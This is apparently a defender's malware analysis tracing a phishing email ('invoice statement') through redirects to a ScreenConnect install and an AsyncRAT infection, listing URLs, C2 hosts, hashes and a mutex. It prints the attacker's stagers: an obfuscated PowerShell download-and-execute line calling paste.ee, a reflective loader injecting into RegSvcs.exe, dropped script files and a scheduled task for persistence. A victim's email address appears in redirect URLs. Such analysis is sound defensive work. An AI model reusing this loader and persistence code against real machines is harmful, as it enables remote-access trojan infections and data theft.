THREAT IDENTIFICATION: SCREENCONNECT -> ASYNCRAT

INFECTION FLOW
First pass:
url (multiple redirects) -> exe (ScreenConnect)

Second pass:
exe (ScreenConnect) -> txt (Powershell) -> PowerShell with embedded .exe

EMAIL SUBJECTS
Your most recent invoice statement is now available online for your review

EMAIL SENDERS
SSA <info@cheapprint.today>

URL FROM THE EMAIL
http://x2uuq.mjt.lu/lnk/AWkAADvF7SkAAc2_wbQAAdP3XygAAAAADz0AAAppAA9tqgBl762kwFR277k2QW-vSEpoM3HUZQAPMzQ/1/5ptlld9mdFCRCccW_7rkGA/aHR0cHM6Ly92ay5jYy9jdmxaaG0_Y2hhcmxpZS5jYWxob3VuQGNveC5uZXQ

DOWNLOAD REDIRECT URLS
https://vk.cc/cvlZhm?charlie.calhoun@cox.net

https://vkontakte.ru/away.php?cc_key=cvlZhm&to=https%3A%2F%2Fecres231.servconfig.com%2F%7Ebuyorsellzw%2Fwp-includes%2Fimages%2Ficon%2Findex.php%3F634

https://vk.com/login?act=vkcomredirect&to=YXdheS5waHA/Y2Nfa2V5PWN2bFpobSZ0bz1odHRwcyUzQSUyRiUyRmVjcmVzMjMxLnNlcnZjb25maWcuY29tJTJGJTdFYnV5b3JzZWxsenclMkZ3cC1pbmNsdWRlcyUyRmltYWdlcyUyRmljb24lMkZpbmRleC5waHAlM0Y2MzQ-

https://vk.com/away.php?cc_key=cvlZhm&to=https%3A%2F%2Fecres231.servconfig.com%2F%7Ebuyorsellzw%2Fwp-includes%2Fimages%2Ficon%2Findex.php%3F634

https://away.vk.com/away.php?rh=932f35e8-4ceb-4953-8e9a-8664fe3b504f

THE PHP SCRIPT CALL RETURNS
< meta name="referrer" content="origin" id="meta_referrer" />
< input id="redir" type="hidden" value="https://ecres231.servconfig.com/%7Ebuyorsellzw/wp-includes/images/icon/index.php?634" />
< script> window.opener = null; window.location.replace(document.getElementById('redir').value);
	< /script>
		<noscript>
			<META http-equiv="refresh" content="0;URL='https:/ / ecres231.servconfig.com / % 7 Ebuyorsellzw / wp - includes / images / icon / index.php ? 634 '">
			<form action="https://ecres231.servconfig.com/%7Ebuyorsellzw/wp-includes/images/icon/index.php?634" method="POST">
				<input type="submit" value="Continue" />
			</form>
		</noscript>

NEXT STAGE REDIRECT
https://ecres231.servconfig.com/%7Ebuyorsellzw/wp-includes/images/icon/index.php?634

DOWNLOAD URL
https://selle.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&c=17392240749318&c=&c=&c=&c=&c=&c=&c=

CERTIFICATE INFORMATION
Name: Connectwise, LLC
Signing time: Thursday, February 15, 2024 12:57:22 AM

SCREENCONNECT SOFTWARE VERSION
23.9.8.8811

RELAY SERVER
relay://instance-m7hinl-relay.screenconnect.com:443/ via http://127.0.0.1:8888/

URLS CALLED BY SCREENCONNECT
http://ahyoussef.webredirect.org:555/1.txt
(This file is a PowerShell script - see below for simplified version)

https://paste.ee/d/OHTFs/0
(This file contains the hex-encoded embedded AsyncRAT executable)

SIMPLIFIED VERSION OF 1.txt
Dim LZeWX(88), OodjR, i  

LZeWX(0) = "[BYTe[]];$A123='IeX(NeW-OBJeCT NeT).WriTeLine('$B456=''eBCLieNT).DOWNLOAD';
[BYTe[]];$C789='VAN(''http://paSte.ee/d/OHTFs/0'')'.RePLACe('VAN','ADSTRING')';[BYTe[]];$A123+$B456+$C789"  

Set objShell = CreateObject("WScript.Shell") objShell.Run "Cmd.exe /c POWeRSHeLL.eXe -NOP -WIND HIDDeN -eXeC BYPASS -NONI " & LZeWX(0), 0, True
Set objShell = Nothing`

THE FILE FROM PASTE.EE WITH THE ENCODED BINARY REMOVED
$Content = @'

$hexString_bbb = "4D_5A_90_00_03_....[redacted for brevity - this is the binary]....00_00_00_00_00_00"

Sleep 5
[Byte[]] $NKbb = $hexString_bbb -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }
[Byte[]] $pe = $hexString_pe -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }

Sleep 5
$HM = 'L###############o################a#d' -replace '#', ''
$Fu = [Reflection.Assembly]::$HM($pe)

$NK = $Fu.GetType('N#ew#PE#2.P#E'-replace  '#', '')
$MZ = $NK.GetMethod('Execute')
$NA = 'C:\W#######indow############s\Mi####cr'-replace  '#', ''
$AC = $NA + 'osof#####t.NET\Fra###mework\v4.0.303###19\R##egSvc#####s.exe'-replace  '#', ''
$VA = @($AC, $NKbb)

$CM = 'In#################vo################ke'-replace '#', ''
$EY = $MZ.$CM($null, [object[]] $VA)

'@
[IO.File]::WriteAllText("C:\Users\Public\Clean.ps1", $Content)

$Content = @'
@e%Clean%%Clean% off
set "ps=powershell.exe"
set "Cleanms=-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass"
set "cmd=C:\Users\Public\Clean.ps1"
%ps% %Cleanms% -Command "& '%cmd%'"
exit /b

'@
[IO.File]::WriteAllText("C:\Users\Public\Clean.bat", $Content)

$Content = @'
on error resume next
Function CreateWshShellObj()
    Dim objName
    objName = "WScript.Shell"
    Set CreateWshShellObj = CreateObject(objName)
End Function

Function GetFilePath()
    Dim filePath
    filePath = "C:\Users\Public\Clean.bat"
    GetFilePath = filePath
End Function

Function GetVisibilitySetting()
    Dim visibility
    visibility = 0
    GetVisibilitySetting = visibility
End Function

Function RunFile(wshShellObj, filePath, visibility)
    wshShellObj.Run filePath, visibility
End Function

Set wshShellObj = CreateWshShellObj()
filePath = GetFilePath()
visibility = GetVisibilitySetting()
Call RunFile(wshShellObj, filePath, visibility)

'@
[IO.File]::WriteAllText("C:\Users\Public\Clean.vbs", $Content)

Sleep 2

$scheduler = New-Object -ComObject Schedule.Service
$scheduler.Connect()

$taskDefinition = $scheduler.NewTask(0)
$taskDefinition.RegistrationInfo.Description = "Runs a script every 2 minutes"
$taskDefinition.Settings.Enabled = $true
$taskDefinition.Settings.DisallowStartIfOnBatteries = $false

$trigger = $taskDefinition.Triggers.Create(1)  # 1 = TimeTrigger
$trigger.StartBoundary = [DateTime]::Now.ToString("yyyy-MM-ddTHH:mm:ss")
$trigger.Repetition.Interval = "PT2M"

# (text string in Arabic)Action
$action = $taskDefinition.Actions.Create(0)  # 0 = ExecAction
$action.Path = "C:\Users\Public\Clean.vbs"

$taskFolder = $scheduler.GetFolder("\")
$taskFolder.RegisterTaskDefinition("PobAMicrosoft.Edge", $taskDefinition, 6, $null, $null, 3)

CONTENTS OF "clean.ps1"
This contains the embedded hex-encoded binary
It appears to be very much like the file shown above from "paste.ee"

CONTENTS OF "clean.bat"
@e%Clean%%Clean% off
set "ps=powershell.exe"
set "Cleanms=-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass"
set "cmd=C:\Users\Public\Clean.ps1"
%ps% %Cleanms% -Command "& '%cmd%'"
exit /b

CONTENTS OF "clean.vbs"
on error resume next
Function CreateWshShellObj()
    Dim objName
    objName = "WScript.Shell"
    Set CreateWshShellObj = CreateObject(objName)
End Function

Function GetFilePath()
    Dim filePath
    filePath = "C:\Users\Public\Clean.bat"
    GetFilePath = filePath
End Function

Function GetVisibilitySetting()
    Dim visibility
    visibility = 0
    GetVisibilitySetting = visibility
End Function

Function RunFile(wshShellObj, filePath, visibility)
    wshShellObj.Run filePath, visibility
End Function

Set wshShellObj = CreateWshShellObj()
filePath = GetFilePath()
visibility = GetVisibilitySetting()
Call RunFile(wshShellObj, filePath, visibility)

EMBEDDED EXECUTABLE FILE HASH
download.exe
fa21d6fe701fd924ac5d2e14e0239118

UNPACKED EXECUTABLE FILE HASH
400000.RegSvcs.exe
f2a0a09b389b6c16e5ce5ad91d205e18

LIKELY ASYNCRAT C2
akok.winconnection.net
15.204.170.41
(Same IP address as: http://ahyoussef.webredirect.org:555/1.txt (above))

OBSERVED MUTEX
\Sessions\1\BaseNamedObjects\AsyncMutex_alccc

STRINGS IN MEMORY
AsyncRAT Server0

SCHEDULED TASK
Name: PobAMicrosoft.Edge (Runs a script every 2 minutes)
Action: Start a program - C:\Users\Public\Clean.vbs





